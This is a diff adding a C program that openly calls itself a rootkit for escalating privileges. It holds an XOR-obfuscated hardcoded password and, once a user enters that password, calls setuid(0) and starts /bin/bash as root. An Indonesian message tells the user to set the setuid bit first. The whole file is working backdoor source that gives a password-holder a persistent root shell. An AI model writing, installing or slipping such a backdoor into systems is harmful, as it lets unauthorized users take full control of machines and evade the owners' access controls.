@@ -1,0 +1,56 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+
+unsigned char key_hash[] = {0xea, 0xd8, 0xc3, 0xc0, 0xcb, 0xc6, 0xea, 0x99, 0x98, 0x9b};
+#define PASS_LEN 10
+#define XOR_KEY 0xAA
+
+int main() {
+    char inputPassword[50];
+    unsigned char decryptedPassword[PASS_LEN + 1];
+
+    printf("<==========[ ROOTKIT: Escalating Privileges ]==========>\n");
+
+    for(int i = 0; i < PASS_LEN; i++) {
+        decryptedPassword[i] = key_hash[i] ^ XOR_KEY;
+    }
+    decryptedPassword[PASS_LEN] = '\0';
+
+    printf("Password to Get Root Access: ");
+    fflush(stdout);
+
+    if (fgets(inputPassword, sizeof(inputPassword), stdin) == NULL) {
+        fprintf(stderr, "Error reading password.\n");
+        return 1;
+    }
+
+    inputPassword[strcspn(inputPassword, "\r\n")] = 0;
+
+    if (strcmp(inputPassword, (char*)decryptedPassword) != 0) {
+        fprintf(stderr, "<==========[        Invalid Password          ]==========>\n");
+        return 1;
+    }
+
+    if (setuid(0) == -1) {
+        perror("setuid failed (Pastikan sudah chmod +s)");
+        return 1;
+    }
+
+    if (getuid() != 0) {
+        fprintf(stderr, "<==========[         Failed To Gain Root        ]==========>\n");
+        return 1;
+    }
+
+    printf("<==========[  Successfully Changed To Root  ]==========>\n");
+    fflush(stdout);
+
+    if (system("/bin/bash") == -1) {
+        perror("system failed");
+        return 1;
+    }
+
+    return 0;
+}
